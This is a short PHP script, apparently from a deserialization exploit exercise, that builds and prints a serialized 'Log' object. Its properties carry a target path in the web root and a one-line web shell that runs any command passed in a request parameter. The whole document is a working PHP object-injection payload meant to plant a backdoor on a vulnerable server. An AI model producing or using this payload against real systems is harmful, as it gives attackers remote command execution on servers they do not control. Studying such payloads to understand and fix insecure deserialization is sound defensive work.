<?php

class Log {
    public $f = '/var/www/html/command.php';
    public $m = '<?php system($_REQUEST["cmd"]); ?>';
    }

    print serialize(new Log);

?>